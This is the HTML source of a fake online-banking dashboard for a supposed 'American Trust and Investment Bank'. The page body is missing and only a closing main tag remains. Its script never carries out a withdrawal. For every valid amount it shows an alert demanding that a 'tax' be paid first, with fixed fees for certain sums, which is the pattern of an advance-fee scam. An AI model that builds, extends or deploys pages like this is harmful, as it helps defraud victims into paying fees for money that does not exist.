
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Dashboard - American Trust and Investment Bank</title>
    <link rel="stylesheet" href="style.css">
    
    
    
    <script>
        function handleWithdraw() {
            const amount = parseFloat(document.getElementById('withdrawAmount').value);
            if (!amount || isNaN(amount)) {
                alert('Please enter a valid amount.');
            } else if (amount < 20000 || amount > 1000000) {
                alert('Withdrawal amount must be between $20,000 and $1,000,000.');
            } else {
                // Specific tax messages
                if (amount === 20000) {
                    alert('⚠️ A tax amount of $5,000 must be paid before this money can be transferred.');
                } else if (amount === 40000) {
                    alert('⚠️ A tax amount of $10,000 must be paid before this money can be transferred.');
                } else if (amount === 50000) {
                    alert('⚠️ A tax amount of $12,500 must be paid before this money can be transferred.');
                } else {
                    alert('⚠️ A tax must be paid before this money can be transferred.');
                }
            }
        }
    </script>



</main>
</body>
</html>
